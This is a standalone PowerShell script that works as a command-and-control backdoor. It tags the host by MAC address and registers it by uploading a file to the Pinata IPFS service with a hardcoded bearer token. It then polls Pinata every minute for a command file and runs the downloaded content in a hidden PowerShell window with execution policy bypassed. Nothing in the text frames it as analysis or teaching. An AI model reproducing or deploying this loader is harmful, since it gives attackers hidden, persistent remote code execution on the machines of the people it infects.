$nic = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.MACAddress} | Select-Object -First 1
$id = $nic.MACAddress -replace ':','-'
$tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySW5mb3JtYXRpb24iOnt9fQ.zyxwvutsrqponmlkjihgfedcba987654"
$reg = "C:\Users\Public\$id.log"
Set-Content $reg "hi"
Invoke-RestMethod -Uri "https://uploads.pinata.cloud/v3/files" -Method Post -Headers @{Authorization="Bearer $tok"} -InFile $reg
for (;;) {
  $r = Invoke-RestMethod -Uri "https://api.pinata.cloud/data/pinList?status=pinned&metadata[name]=$id.txt" -Headers @{Authorization="Bearer $tok"}
  $h = $r.rows[0].ipfs_pin_hash
  if ($h) {
    $body = (Invoke-WebRequest -Uri "https://gateway.pinata.cloud/ipfs/$h").Content
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command $body"
  }
  Start-Sleep 60
}
